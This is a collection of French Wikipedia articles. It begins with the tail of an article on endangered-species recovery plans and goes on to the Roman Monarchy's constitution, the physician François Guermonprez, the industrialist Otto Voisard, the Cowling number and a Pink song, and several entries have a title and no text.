Le plan le plus connu du public est le « Plan Ours » visant la protection et le confortement de la population relictuelle des Pyrénées, en déclin rapide depuis les années 1940 (disparition totale des derniers ours du Vercors) et au bord de l'extinction dans les années 1980-1990. D'autres plans concernent par exemple :
Le dernier plan prévu pour 2008 concernait le Râle des genêts ; coordonné par la DIREN Pays de la Loire en 2008, il met à jour les informations disponibles via une enquête préliminaire sur les actions déjà conduite pour sauvegarder cette espèce et/ou son habitat naturel (les prairies des zones humides à hautes herbes) :
Le Grenelle de l’environnement dans son programme visant à « stopper la perte de la biodiversité » a en 2008 proposé des plans de conservations et de restauration (pour cinq ans) pour 131 espèces en danger critique d’extinction sur la liste rouge mondiale de l’UICN, dont plus de la moitié (70 espèces) sont des plantes. 
Sur ces 131 espèces, 44 vivent en métropole et 87 en outre-mer, dont 53 en Polynésie française et 35 en Nouvelle-Calédonie.
9 espèces animales sont strictement marines, avec des actions de gestion relevant de la politique des pêches.
Le ministère de l'Écologie est chargé d'établir régulièrement des Plans nationaux d’actions (PNA) en faveur des espèces menacées.
Par exemple en 2009, 15 espèces ont été retenues dont 2 étaient déjà l’objet d’un plan en 2008 ("Margaritifera margaritifera" (moule d’eau douce) et "Zanthoxylum heterophyllum" (bois de poivre). 13 autres plans étaient prévus dont 7 à initier en 2009.
Espèces dites « "Grenelle" » avec plan de restauration prévu en 2009.
Espèces dites « "Grenelle" » avec plan de restauration prévu en 2009 :
Flore
Faune
Espèces issues de la priorisation nationale (7)
Espèce ayant fait déjà l’objet d’un plan de restauration et nécessitant un second plan (1)
Voir aussi.
Liens externes.
Deux exemples de plans de restauration nationaux 

</doc>
<doc id="3216930" url="https://fr.wikipedia.org/wiki?curid=3216930" title="Dictionnaire de la géographie et de l'espace des sociétés">
Dictionnaire de la géographie et de l'espace des sociétés

Le Dictionnaire de la géographie et de l'espace des sociétés est un dictionnaire de géographie rédigé sous la direction de Jacques Lévy et Michel Lussault.
Les différents articles ont été rédigés par cent-dix auteurs issus du milieu universitaire. Les entrées sont classées en quatre catégories : 

</doc>
<doc id="3216942" url="https://fr.wikipedia.org/wiki?curid=3216942" title="Jacques Levy (géographe)">
Jacques Levy (géographe)



</doc>
<doc id="3216943" url="https://fr.wikipedia.org/wiki?curid=3216943" title="Maurice Humbert">
Maurice Humbert

Maurice Joseph Humbert est un architecte français, né le à Paris et mort le au château du Hallier (Eure-et-Loir).
Biographie.
Fils du célèbre architecte Pierre Humbert, il suit les traces de son père et érige avec lui de nombreux immeubles et hôtels particuliers à Paris et en Europe. 
Ce duo était également réputé pour ses brillantes restaurations notamment de châteaux et manoirs en France et en Belgique. 
La Première Guerre mondiale porta en 1918 un terme à leur fructueuse collaboration ; Maurice Humbert, lieutenant du régiment d'infanterie, fut mortellement blessé lors d'un combat au front, et décéda entouré des siens dans la demeure familiale du château du Hallier en 1918.
Il fut décoré de la croix de guerre 1914-1918 ainsi que de la Légion d'honneur, .
Il eut quatre enfants : Jean, Denise, Pierre et Madeleine. Il est enterré au cimetière du Montparnasse.
Réalisations notables.
Maurice Humbert cosigna avec son père Pierre Humbert de nombreuses réalisations, dont on trouvera ci-dessous une sélection des plus notables :

</doc>
<doc id="3216952" url="https://fr.wikipedia.org/wiki?curid=3216952" title="Nombre de Cowling">
Nombre de Cowling

Le nombre de Cowling formula_1 est un nombre sans dimension utilisé en magnétohydrodynamique. Deux versions de ce nombre sont utilisées, mais la deuxième version est la plus connue.
Ce nombre porte le nom de Thomas George Cowling, physicien et mathématicien anglais.
CoI.
On le définit de la manière suivante :
formula_2
avec :
CoII.
Le deuxième nombre de Cowling consiste en la réciproque au carré du nombre d'Alfven. Il s'agit donc du rapport de la vitesse de l'onde d'Alfven sur la vitesse du fluide, le tout au carré. C'est la version la plus utilisée. C'est l'équivalent du nombre de Mach en magnétohydrodynamique. Certaines références définissent ce nombre comme étant simplement la réciproque du nombre d'Alfven. 
On le définit de la manière suivante :
formula_3
avec :

</doc>
<doc id="3216959" url="https://fr.wikipedia.org/wiki?curid=3216959" title="Phycodnavirus">
Phycodnavirus



</doc>
<doc id="3216966" url="https://fr.wikipedia.org/wiki?curid=3216966" title="Les Sonneries de la mort">
Les Sonneries de la mort



</doc>
<doc id="3216969" url="https://fr.wikipedia.org/wiki?curid=3216969" title="Histoire de la constitution de la Monarchie romaine">
Histoire de la constitution de la Monarchie romaine

La constitution de la Monarchie romaine investit le roi du pouvoir souverain. Il existe deux contrôles rudimentaires sur ce pouvoir qui prennent la forme d’un conseil d’anciens (le Sénat) et d’une assemblée populaire (les comices curiates). Ce système est similaire à celui des cités-états grecques contemporaines (telles que Sparte ou Athènes). Ces principes constitutionnels grecs sont certainement parvenus jusqu’à Rome par le biais des colonies grecques de "Magna Graecia" (Grande-Grèce, au sud de la péninsule italienne). Durant les siècles précédant la fondation légendaire de Rome, les Grecs ont colonisé une grande part du monde méditerranéen. Ces colons emportent avec eux leurs idéaux et gardent souvent contact avec leur pays natal. Par conséquent, la constitution romaine a sûrement quelques origines grecques.
Premiers Romains.
Les premiers Romains sont organisés en divisions héréditaires appelées "gens" ou « clans ». Pendant longtemps, ce genre de divisions est familier de la majorité des Indo-Européens. Chaque clan se compose d’un agrégat de famille vivant sous la tutelle d’un patriarche, appelé "pater" (mot latin pour « père »). Chaque "gens" constitue une unité qui s’autogouverne. Chaque membre d’une "gens" particulière partage les mêmes droits et les mêmes responsabilités que les autres membres. Chacun des clans se gouverne lui-même de façon démocratique (chaque membre peut voter) ou aristocratique (un groupe d’anciens gère les problèmes).
Les plus simples des communautés indo-européennes se composent d’un petit nombre de clans. Ces communautés, connues sous le nom de "pagi", se regroupent autour d’un point fortifié appelé "arx". Chaque "pagi" est soit purement démocratique, soit purement aristocratique. Bien avant la date traditionnelle de la fondation de Rome, un groupe de "pagi" s’est fusionné en confédération, la ville d’Albe-la-Longue ("Alba Longa") constituant son point de rassemblement. Néanmoins, après un certain temps, le siège de cette confédération se déplace à Rome.
Fondation de Rome.
Les premiers Romains se sont probablement installés sur la rive gauche du Tibre, à environ de l’embouchure de la rivière. Le premier village indépendant se trouvait sûrement sur le Palatin. D’autres se sont formées sur le Quirinal, l’Esquilin, le Capitole et sur les collines du Caelius. Au sommet de chaque colline se tient une citadelle protégeant les habitants. Très tôt, ces villages ont fusionné pour former la ville de Rome. Autour de cette période, il existait probablement des extensions vers le sud ainsi que le long de la rive gauche jusqu’à l’embouchure du Tibre.
Débuts de la Monarchie.
La Monarchie peut être divisée en deux périodes. La première voit le règne des quatre premiers rois légendaires, mettant sur pied les fondations des institutions politiques et religieuses de la ville. La ville est organisée en curies, le Sénat et les comices deviennent officiels. Rome s’engage dans plusieurs guerres de conquête. C’est à cette époque que serait fondé le port d’Ostie et qu’est construit le premier pont sur le Tibre.
Familles patriciennes et leur division en curies.
Les Romains sont divisés en trois groupes ethniques. Suivant la tradition, le premier groupe est appelé les "Ramnes". Ce groupe, composé des Latins, habite les premiers villages. Le deuxième groupe est appelé les "Tities" et représente probablement l’élément sabin, intégré à la communauté plus large. Les origines du troisième groupe, les "Luceres", restent inconnues des historiens antiques, comme c’est toujours le cas aujourd’hui. Néanmoins, ce groupe représente certainement l’élément étrusque.
Les familles appartenant à l’un de ces trois groupes constituent les premières familles patriciennes. Afin d’organiser la ville, ces familles patriciennes l’ont divisé en unités appelées curies, bien que selon la légende, cette organisation est imputée au premier roi, Romulus. Chacun des trois groupes ethniques est divisé en dix curies.
Création du Sénat, des comices curiates et des comices calates.
Quelques-uns des clans s’autogouvernent de façon démocratique avec chaque membre possédant le droit de vote. D’autres s’autogouvernent de façon aristocratique, organisés autour d’un conseil d’anciens. Quand ces clans ont fusionné pour donner naissance à une plus large communauté, les deux méthodes ont été conservées pour gouverner.
Les premiers Romains s’expriment démocratiquement au travers d’une "comitia" (« assemblée » ou « comice »). Les deux principales assemblées formées sont connues sous les noms de comices curiates et de comices calates. Les comices sont l’incarnation des tendances démocratiques des premiers clans. Pour mieux respecter la forme de démocratie directe utilisée par les clans confédérés, les deux comices sont organisées de façon à refléter au mieux les divisions ethniques de la ville. Les comices sont donc organisées par curies. Les membres de chacun des trois groupes ethniques ("Ramnes", "Tities" et "Luceres") sont assignés à une curie précise, chaque groupe étant divisé en dix curies.
L’équivalent aristocratique des assemblées prend la forme d’un conseil municipal des anciens. Alors que les conseils de chaque clan se composent des anciens des familles dirigeantes du clan, le conseil municipal se compose des anciens appartenant aux clans dirigeants de la ville, conseil qui deviendra le Sénat. Celui-ci (selon la légende) se compose de 100 anciens (des "patres") venant de chacun des trois groupes ethniques et constituant les premiers sénateurs romains.
Roi de Rome.
Le peuple et les anciens ont reconnu la nécessité d’avoir un dirigeant politique unique, appelé le "rex". Selon une tradition datant de la période républicaine, peuple élit le roi tandis que les anciens le conseillent. Cependant, cette monarchie légitimiée par le peuple est peu crédible. En réalité, l'accession au trône des rois de Rome émanerait plutôt du Sénat : les composant ce conseil de nobles sélectionnaient dix d'entre eux afin de choisir le nouveau roi à vie. Ce dernier est ensuite investi par les comices curiates, mais n'accède définitivement au trône qu'après que les augures confirment que la décision est favorable.
Monarchie tardive.
La deuxième période, plus riche en évènements que la première, voit le règne des trois derniers rois légendaires, l’importante expansion du territoire romain et le développement de la classe plébéienne avec son intégration partielle à la structure politique de la ville. Enfin, cette seconde période voit les seuls rois étrangers ayant régné sur Rome avec leurs successions basées sur l’hérédité.
Les trois rois étrusques légendaires entament une politique de conquête. Sans se pencher en détail sur le degré de véracité de ces légendes, il est très probable que de telles conquêtes aient bien eu lieu à la fin de la Monarchie. Il devient alors nécessaire de déterminer ce qui doit être fait des peuples conquis.
Apparition de la classe plébéienne.
Le plus souvent, les habitants dont les villes ont été conquises y demeurent. Leur vie quotidienne et leur système de gouvernement restent les mêmes, mais leurs villes perdent leur indépendance vis-à-vis de Rome. Néanmoins, un certain nombre vient à Rome. Pour acquérir un statut économique viable et légal, les nouveaux arrivants doivent accepter une dépendance envers une famille patricienne ou envers le roi (qui est lui-même un patricien) ; ils deviennent alors clients d’une famille patricienne. En fin de compte, ceux qui s’étaient attachés au roi sont libérés de leur dépendance. Ces derniers constituent alors les premiers plébéiens.
Comme Rome s’agrandit, de plus en plus de soldats sont nécessaires aux conquêtes. Les non-patriciens appartiennent à la même curie que leurs patrons. En ce temps, l’armée est organisée sur la base des curies, de sorte que les individus dépendants de familles doivent se battre. Néanmoins, quand ils sont délivrés de leur dépendance, ils quittent la curie à laquelle appartient leur patron. Ils ne sont alors plus obligés de se battre mais ils perdent tout statut politique ou économique.
Pour faire revenir ces plébéiens dans l’armée, les patriciens ont dû faire des concessions, dont on ne connaît pas exactement la nature. Une des conséquences est que les plébéiens ont désormais le droit de posséder leurs propres terres. Devenus propriétaires terriens, ils ont maintenant tout intérêt à défendre la ville car si elle venait à être conquise, ils perdraient toutes leurs terres. Néanmoins, il ne leur ait donné aucun pouvoir politique. Tous ces éléments qui se mettent en place conduiront à la Guerre des ordres.
Réorganisation servienne de l’armée.
Pour faire revenir les plébéiens dans l’armée, le roi Servius Tullius abolit l’ancien système qui organisait les armées sur la base des curies et le remplace par un système basé sur la propriété terrienne.
Création des centuries et des tribus.
Suivant la réorganisation de Servius Tullius, deux nouvelles unités sont créées. L’armée est divisée en centuries ("centuriae"). De futures réorganisations seront plus efficaces en se basant sur les tribus.
Chaque centurie est dirigée par un centurion. Les centuries sont organisées sur la base de la propriété terrienne. Tout individu, patricien ou plébéien, peut devenir membre d’une centurie. L’appartenance à une curie, au contraire, est purement héréditaire : seuls les patriciens (et leurs clients) peuvent devenir membres d’une curie. L’organisation par curie de l’armée est alors remplacée par une organisation par centuries selon les réformes de Servius Tullius.
Selon les réformes de Servius Tullius, l’armée doit être réorganisée régulièrement. Pour aider les futures réorganisation, une nouvelle unité est créée, appelée tribus. Chaque tribu élit un dirigeant appelé tribun. Servius Tullius fonde quatre tribus : les "Palatina", "Suburana", "Collina" et "Esquilina". La ville entière est répartie parmi ces quatre tribus. Bien qu’aucun territoire ne puisse être cédé à une tribu, il ne peut pas lui en être enlevé non plus. De fait, les nouvelles tribus créées plus tard devront occuper un territoire plus éloigné autour de Rome. Les tribus constituent une amélioration des curies déjà existantes. Tout comme pour ces dernières, l’appartenance à une tribu est héréditaire. Néanmoins, patriciens et plébéiens sont acceptés (contrairement aux curies). Tous les Romains sont assignés à une tribu en fonction de là où ils vivent, de plus un Romain appartiendra à la même tribu que son père.
Classes des centuries.
Selon les réformes de Servius Tullius, la cavalerie est divisée en 18 centuries. Ces soldats sont appelés les "equites" et sont suffisamment riche pour posséder un cheval. Ils sont d’origine aristocratique et forment la classe des officiers de l’armée.
L’infanterie est répartie en cinq classes. La première est composée d’hommes possédant vingt arpents de terre, la deuxième, d’hommes possédant quinze arpents, la troisième, dix arpents, la quatrième, cinq arpents et enfin la cinquième, deux arpents. Chaque classe est divisée de façon égale entre les centuries des "iuniores" (« jeunes hommes » ou « juniors ») et "seniores" (« hommes âgés » ou « seniors »). Les "iuniores" sont des soldats âgés de 17 à 46 ans qui servent sur le champ de bataille. Les "seniores" sont des soldats âgés de 46 à 60 ans et constituent les garnisons.
Les soldats non-armés sont répartis dans les cinq dernières centuries. Quatre sont composées d’artisans et de musiciens. La cinquième, les "proletarii", se composent d’hommes ayant peu ou pas de propriétés.
Création des comices centuriates.
Les centuries se rassemblent dans une nouvelle assemblée appelée "comitia centuata" (comices centuriates). À sa création, cette assemblée ne dispose d’aucun pouvoir politique ou législatif. Elle est simplement utilisée comme point de réunion de l’armée.
Fin de la Monarchie.
Le premier roi étrusque de Rome, Tarquin l'Ancien, succède à Ancus Marcius. Il a été suggéré que Rome a été envahi par les Étrusques, bien que cela reste improbable. La ville est située sur une position facilement défendable et son expansion rapide attire les populations de toute la région. La politique libérale de la ville constitue une opportunité pour un dirigeant compétent de gagner le trône.
Le règne des quatre premiers rois se distingue du règne des trois rois précédents. Les premiers rois sont élus mais entre le règne des quatre premiers et celui des trois suivants, la monarchie devient héréditaire : ces trois rois ont tous un lien de parenté et il n’y a plus d’interrègne ("interregnum"). Le fait que l’"auspicia" ne revient plus au Sénat entre la mort d’un roi et l’accession au trône de son successeur constitue une sérieuse atteinte à l’autorité du Sénat et l’empêche de faire élire le roi de son choix.
C’est cette atteinte à la souveraineté du Sénat, plutôt qu’une tyrannie intolérable, qui pousse les patriciens à chasser le dernier roi. Le roi a dû chercher des soutiens parmi les plébéiens, mais ceux-ci, fatigués de leur service militaire continu, de leur participation forcée dans la construction de bâtiments publics et de leur absence de poids politique, ne soutiennent ni le roi, ni le Sénat.
Transition constitutionnelle de la Monarchie à la République.
Selon la légende, le dernier roi, Tarquin le Superbe, est chassé en 509 av. J.-C. Plutôt que d’élire un nouveau roi, le Sénat élit deux consuls (portant le nom de « préteurs ») aux mandats limités et établit la République romaine. D’après la légende, la constitution de la République diffère radicalement de celle de la monarchie. Il est plus probable que la transition se soit fait graduellement. Il y a certainement eu un renversement rapide de la Monarchie, mais la seule vraie différence à cette époque a été de remplacer le roi par deux consuls (« préteurs ») aux mandats limités.

</doc>
<doc id="3216974" url="https://fr.wikipedia.org/wiki?curid=3216974" title="Atlassian Confluence">
Atlassian Confluence



</doc>
<doc id="3216976" url="https://fr.wikipedia.org/wiki?curid=3216976" title="François Guermonprez">
François Guermonprez

François Guermonprez, né à Haubourdin et mort en à Lille, est un médecin français, professeur à la faculté catholique de Lille et un militant catholique et royaliste, membre de l'Action française.
Biographie.
Jeunesse et études.
François Jules Octave Guermonprez naît à Haubourdin le . Son père, François Jules Guermonprez, industriel et pharmacien, est issu d’une grande tradition d’industriels lillois, épurateurs et fabricants d’huile et importateurs de pétrole, et avait épousé Octavie Dumez deux ans auparavant.
De 1860 à 1867, il fait ses études secondaires au Collège de Marcq-en-Barœul, et très vite, se sent attiré par l’étude des sciences médicales. Il intègre l’École Préparatoire de Pharmacie de Lille en 1868. L’année suivante, il est préparateur d’histoire naturelle, puis en 1869-70, préparateur du cours de chimie médicale.
En 1870, il entreprend des études de médecine, troublées par la guerre. Devenu interne titulaire de l’Hôpital Saint-Sauveur de Lille, en 1872, il soutient sa thèse trois ans plus tard, sur la maladie d’Addison, sous la direction du Docteur Duret. À vingt-six ans, il devient docteur en médecine de la Faculté de Paris le . La même année, il devient médecin de la Compagnie des chemins de fer du Nord et participe activement à la fondation de la Faculté catholique de Médecine et de Pharmacie de Lille.
Professeur à la faculté catholique de Lille.
Il est nommé maître de conférences de zoologie médicale et professeur suppléant chargé du cours d'histoire naturelle médicale. Parallèlement, avec ses frères Paul et Octave, pharmaciens, il produit des pansements, antiseptiques, des médicaments et développe une fabrique de boules de gommes médicinales, qu’il exportera en Chine et en Russie.
En 1876, il épouse Angette Marie Richebé, dont il aura deux filles, toutes deux décédées en bas âge.
En 1885, il est nommé professeur titulaire à la Faculté Catholique de Lille. Enseignant la thérapeutique et la matière médicale, il met au point plusieurs procédés restés emblématiques, comme le crin de Florence.
Il est membre fondateur de la Société des Sciences anatomiques et des sciences médicales de Lille, membre des sociétés françaises de botanique et de zoologie, membre correspondant des sociétés de Paris, Bordeaux, Lyon, Liège, Barcelone et de nombreuses autres.
Publications scientifiques.
Il s’intéresse de près à la traumatologie et tout particulièrement aux accidentés du travail : fractures et luxations diverses, fractures du crâne, arrachements de bras, de doigts, plaies par peignes de filature, par coups d’engrenages, par coups de meule, par machine à percer, par écrasement, corps étrangers de la métallurgie, accidents des ouvriers du bois. En 1885, il rassemble la plupart de ses publications sur ces sujets, dans un ouvrage intitulé "Pratique chirurgicale des établissements industriels". Il publie également un ouvrage de référence sur la mécanothérapie, où il traite largement la gymnastique médicale et le traitement des fractures. Sa grande œuvre est la chirurgie orthopédique et réparatrice. Hyppolite Larrey, membre de l’Académie de médecine, le qualifie d’ailleurs de chirurgien de l’industrie.
Également chirurgien généraliste, il est salué pour son procédé d’hystérectomie abdominale par Lannelongue, qui le trouve plus simple et plus facile que les méthodes antérieures. Il publie également une petite brochure où il décrit avec minutie un cas de pseudohermaphrodisme masculin.
Dans tous ses écrits, Guermonprez fait une large part à l’histoire de la médecine, écrivant ainsi plusieurs articles sur Ambroise Paré et René-Théophile-Hyacinthe Laennec et consacre un livre à Antoine Béchamp. Guermonprez réorganise le service médico-chirurgical de la Compagnie des chemins de fer du Nord à Fives, et établit un autre service à Hellemmes. Grâce à l’appui et avec l’industriel lillois Etienne Batteur, il crée une maison de secours pour les blessés de l’industrie"". Nommé chirurgien chef, il reçoit plus de blessés par an et y fait se succéder plus de 150 internes, entre 1893 et 1901.
Attaché à la tradition familiale d‘industriels et profitant des laboratoires des "Huiles et Graisses Guermonprez" et des "Huiles Lambelin-Ternoy-Goube", il publie également une étude sur le papillome des raffineurs de pétrole. En 1902, en pleine campagne de laïcisation, on ferme le service des accidentés du travail et de mécanothérapie, profitant de l’expulsion des pères camilliens . Guermonprez enrage mais crée un nouveau service spécial de chirurgie du travail et de mécanothérapie au 104, boulevard Vauban. Puis, en 1906, après l’expulsion des religieuses du Carmel, pour acquérir le Carmel, 254, rue Nationale, où il crée une clinique de mécanothérapie et de chirurgie des accidentés du travail, aux procédés innovants en France.
Première Guerre mondiale.
Après avoir été mobilisé en 1870, il reprend l’uniforme en 1914, comme médecin major de la première division à l’Hôpital militaire de Cambrai. Il est également mobilisé à l’hôpital de Calais. La clinique souffre alors des bombardements et le matériel est dispersé. En 1921, il reprend ses consultations de mécanothérapie et tente, en vain, de créer un nouveau centre, sa situation financière étant devenue délicate.
L’institut CRUD.
En 1896, il est nommé directeur scientifique de l’Institut orthopédique Crud à Sens, fondé en 1884 par l’abbé Philipert Crud, un homme charismatique, à la réputation de guérisseur, qui passa une partie de sa vie au Canada pour évangéliser et soigner les indiens, par des méthodes efficaces mais secrètes, découvertes chez les indiens d’Amérique. Guermonprez, encouragé par Monseigneur Louis Baunard, convainc Crud de transférer son centre à Lille, et, le 30 septembre 1896, est posée la première pierre de l’Institut orthopédique du Sacré Cœur.
Cet institut, incompris, est jugé surprenant par ses détracteurs et François Guermonprez se retrouve révoqué de son poste de médecin de la Compagnie des chemins de fer du Nord. La Faculté catholique, elle aussi, se méfie mais ne sanctionne pas le Docteur. L’Institut du Sacré Cœur prospère alors, avec plus de 300 lits, mais des plaintes sont déposées contre Crud pour exercice illégal de la médecine.
En 1919, le bâtiment, transformé en hôpital militaire, est incendié, accidentellement, par un soldat hindou de l’armée anglaise. Il ne sera pas reconstruit.
L’abbé Lemire.
Vers 1910, François Guermonprez mène une lutte acharnée contre l’engagement politique de l’Abbé Lemire, au travers de dix ouvrages. François Guermonprez reproche à l’Abbé Lemire, son engagement politique privilégié à sa foi, ce qui vaudra à Lemire d’être suspendu par l’évêque de Lille en 1914. Dans "L’Éveil populaire" et "Le Clairon des Flandres", Léon Devos, fervent royaliste, ancien élève des facultés catholiques qui dirige les deux journaux et François Guermonprez s’élèvent violemment contre Monseigneur Delamaire, archevêque de Cambrai, et dénoncent son silence pendant la période électorale et son indifférence face aux actions de Lemire.
Le 7 novembre 1911, Monseigneur Delamaire condamne leurs publications et les désavouent. Guermonprez, considéré, peut-être à tort (même si des archives familiales, les archives du diocèse de Cambrai ou de l’Action française, le présentent comme l’éminence grise) comme le fondateur de ces journaux et Devos se tournent alors vers le Vatican et adressent une supplique au Pape Pie X. Le cardinal Merry del Val, qui les considère comme « de bons catholiques », apaise les tensions, les encourage à continuer le combat contre Lemire, mais la publication de "L’Éveil populaire" et du "Clairon des Flandres" est stoppée en janvier 1912, le pape leur ordonnant d’être plus pacifistes et d’implorer le pardon de Monseigneur Delamaire, proche de la démission. 
Delamaire, plutôt que de reconnaitre sa responsabilité dans l’affaire et une certaine bienveillance pour Lemire, souhaite le « silence » de François Guermonprez, mais ce dernier continue à faire entendre sa voix et réitère ses attaques contre Lemire dans un journal militant, auquel il est associé, le "Nord Patriote", dirigé par son ami Robert Havard de La Montagne, membre actif, comme lui, de l’Action française et ami intime de Charles Maurras.
La Sapinière.
Proche également de Louis Veuillot, François Guermonprez s’illustre aussi en tant que membre du Sodalitium Pianum, organisation secrète, opposée au Modernisme, créée par Monseigneur Benigni, en étroite collaboration avec l’Action française. Cet organisme se définissait comme . L’organisation aurait compté, dès 1912, environ un millier de membres et disposait de relais dans les principaux centres catholiques.
Ces « antennes » étaient dirigées par des personnes cultivées et surtout des catholiques intégraux convaincus, qui se réunissaient, lors de congrès libres, amicaux, appelés les « confiseries ». Vraisemblablement, François Guermonprez animait l’un de ces cercles.
Les perquisitions et l'affaire des fiches.
Membre fervent de l’Action française du Nord, François Guermonprez est proche des Jeunesses Royalistes, dirigées par Roger Lambelin, et comme lui, fait l’objet de perquisitions, comme l’attestent plusieurs rapports de police. En 1899, la Jeunesse Royaliste est dénoncée comme responsable d’un complot permanent et public contre la République. Les principaux chefs royalistes, Buffet, Godefroy et de Ramel sont réunis devant le Sénat. Les archives de Buffet révèleront une liste de hauts fonctionnaires et intellectuels, dont la nomination était prévue en cas de succès (Lambelin et Guermonprez y figurent). Les condamnations des trois responsables seront symboliques, mais tous subirent une répression acharnée.
Fin de vie.
François Guermonprez prend sa retraite en 1927, après une vie de luttes, palpitante et mouvementée. Il est décoré officier, puis Chevalier de la Légion d’Honneur en 1915 et en 1924, Chevalier de l’Ordre de Saint-Grégoire-le-Grand, commandeur de l’Ordre Polonia Restituta pour son soutien et son engagement militaire et économique envers la Pologne, Commandeur de l’Ordre de Saint-Sylvestre réformé par Pie X, en 1918, le pape lui-même lui adressant une lettre de louanges. Le , la Belgique lui confère la croix de Chevalier de l’ordre de Léopold.
Ses multiples activités ne l’empêchèrent pas d’être un parent engagé attentif, qui porta toujours intérêt aux études, à la santé de Denis Guermonprez Goube, Henri Guermonprez Flipo, des Richebé, Fauvarque, ou du docteur Delattre, son neveu par alliance, qui lui succéde à l’"Action française".
Il décède le , à Lille, à l’âge de 83 ans, dans le plus grand dénuement, après avoir tout légué, dont sa maison lilloise, à l’École des Congrégations (Blanche de Castille).
Archives.
François Guermonprez laisse derrière lui plus de 200 ouvrages, une incroyable bibliothèque, une centaine d’articles, des archives reparties entre la faculté libre de Médecine de Lille, le diocèse de Cambrai, les archives départementales du Nord, la bibliothèque municipale de Lille, ou encore la Faculté de médecine de Paris. Son imposant buste en marbre trône aujourd’hui à la Faculté Catholique de Médecine de Lille, au côté de doyens et professeurs illustres.
Postérité.
Le 14 mai 2008 s’est tenue à la Faculté Catholique de Lille, une conférence intitulée « "François Guermonprez, précurseur contesté, polémiste acharné" », animée par le professeur Jacques Liefooghe, doyen de la Faculté de médecine, le professeur Henri Ducoulombier, ancien pédiatre et historien, membre de la Société d’Histoire de la Médecine et auteur d’un ouvrage sur le baron Pierre-François Percy et Paul-Henry Guermonprez.

</doc>
<doc id="3216979" url="https://fr.wikipedia.org/wiki?curid=3216979" title="Plug TV">
Plug TV



</doc>
<doc id="3216983" url="https://fr.wikipedia.org/wiki?curid=3216983" title="Arrondissement de Zwolle">
Arrondissement de Zwolle

L'arrondissement de Zwolle est une ancienne subdivision administrative française du département des Bouches-de-l'Yssel créée le et supprimée le .
Composition.
Il comprenait les cantons de Hasselt, Kampen, Steenwijk, Vollenhove et Zwolle.

</doc>
<doc id="3216984" url="https://fr.wikipedia.org/wiki?curid=3216984" title="Anaxagore de Clazomène">
Anaxagore de Clazomène



</doc>
<doc id="3216985" url="https://fr.wikipedia.org/wiki?curid=3216985" title="Homosexualité dans la chanson">
Homosexualité dans la chanson



</doc>
<doc id="3216987" url="https://fr.wikipedia.org/wiki?curid=3216987" title="Homosexualité dans la chanson français">
Homosexualité dans la chanson français



</doc>
<doc id="3216989" url="https://fr.wikipedia.org/wiki?curid=3216989" title="Otto Voisard">
Otto Voisard

Otto Voisard, né le à Vienne en Autriche et mort le à Vienne, est un industriel austro-allemand.
Otto Voisard fut nommé président du comité de direction (PDG) de MAN et ensuite fut appelé en Autriche au poste de directeur général de Steyr Daimler Puch.
Biographie.
En 1951 Otto Voisard entama sa carrière professionnelle chez « Alpine » à Donawitz, en Autriche.
En 1956 Otto Voisard commença son activité professionnelle en Allemagne à la société MAN à Augsbourg où, après peu de temps, il fut nommé assistant personnel de M. Neumann, qui était alors président directeur général. Entre 1956 et 1969, Otto Voisard travailla au bureau d’études de MAN à Hambourg dont il fut plus tard nommé directeur. Le bureau d’études était spécialisé dans la construction de moteurs navals et d’installations de grues industrielles. 
En 1969, Otto Voisard prit la fonction de directeur au sein de la société MTU Aero Engines (Munich et Friedrichshafen) qui venait d’être fondée par Mercedes et MAN. Cette entreprise était spécialisée dans la mise au point de moteurs d’avion et de moteurs diesel. De cette période date l’étroite collaboration de Otto Voisard avec le professeur Werner Niefer (Mercedes-Benz). À cette époque, MTU signa un contrat important pour la construction en licence de moteurs McDonnell Douglas F-4/F-4 Phantom II et Otto Voisard travailla en collaboration étroite avec M. le docteur Gerhard Neumann, ingénieur, qui était alors vice-président de General Electric. 
En 1974, Otto Voisard revient à la division véhicules utilitaires de MAN en tant que membre du comité de direction. En 1976, un contrat pour la livraison de 1200 cars pour l’Algérie fut signé. En 1979, Otto Voisard fut nommé président du comité de direction (PDG) de MAN. Sous sa responsabilité, la fusion de l’entreprise avec Burmeister and Wain (B&amp;W) fut réalisée en 1981. À l’époque, le contrat signé pour la transformation de turbines à vapeur (Queen Elizabeth 2) en moteurs diesel MAN – B&amp;W renforça grandement la renommée de l’entreprise. En 1981, Otto Voisard reçut l’Ordre du mérite de Bavière de l’ancien ministre-président, Franz Josef Strauss. 
En 1986, avec le soutien de Dr. Hannes Androsch, qui était alors directeur général de la banque autrichienne Creditanstalt-Bankverein, Otto Voisard fut appelé en Autriche au poste de directeur général de Steyr Daimler Puch. Cette période est surtout marquée par la coopération avec Chrysler et son PDG Lee Iacocca, qui allait déboucher en 1988 sur l’ouverture d’une usine Chrysler à Graz et sur la construction du modèle automobile Chrysler Voyager. Par ailleurs, il travailla au développement du système d’entraînement pour les modèles Mercedes de la classe G (Mercedes G et Puch G à Graz) en étroite collaboration avec le professeur Dr. Werner Niefer de Mercedes. En 1991, Otto Voisard reçut l’Ordre du mérite de la République d’Autriche.
Enfance et formation.
Otto Voisard a fait ses études primaires et secondaires à Vienne et à Berlin mais en 1944, il fut appelé sous les drapeaux et dut servir aux canons aériens à Vienne. Il fut ensuite engagé sur un torpilleur (T38) responsable de la protection et de l’accompagnement du grand croiseur (Schwerer Kreuzer Prinz Eugen, 1938). Otto Voisard a passé son baccalauréat après la fin de la guerre et fait des études universitaires à la faculté technique de Vienne (université technique de Vienne) où il obtint en 1951 le diplôme d’ingénieur en construction mécanique.
Vie de famille.
Chez « Alpine » (Leoben/Donawitz) en Autriche Otto Voisard rencontra sa future épouse Gertrude Lenk ; après son mariage en 1956, le couple s’installa en Allemagne et eut trois fils. 
Décès.
Otto Voisard meurt le à Vienne à la suite d’une brève maladie. Il est enterré au cimetière de l'Ouest de Munich.

</doc>
<doc id="3216990" url="https://fr.wikipedia.org/wiki?curid=3216990" title="So What (chanson de Pink)">
So What (chanson de Pink)

 est une chanson écrite par la chanteuse américaine Pink, Max Martin et Shellback pour le cinquième album studio de la chanteuse, "Funhouse", sorti en 2008. "" en est le premier single.
Historique.
Cette chanson fait référence à la séparation entre Pink et son mari, Carey Hart, avant leur réconciliation fin 2008. Ce dernier apparaît d'ailleurs dans le clip.
Utilisations.
"So What" est utilisée dans le deuxième épisode de la première saison de la série "Castle" (2009) et dans le cinquième épisode de la saison neuf de "Mon oncle Charlie" (2011).

</doc>
<doc id="3216991" url="https://fr.wikipedia.org/wiki?curid=3216991" title="Renault kangoo 2">
Renault kangoo 2



</doc>
<doc id="3216993" url="https://fr.wikipedia.org/wiki?curid=3216993" title="Le Ver dans le fruit">
Le Ver dans le fruit



</doc>
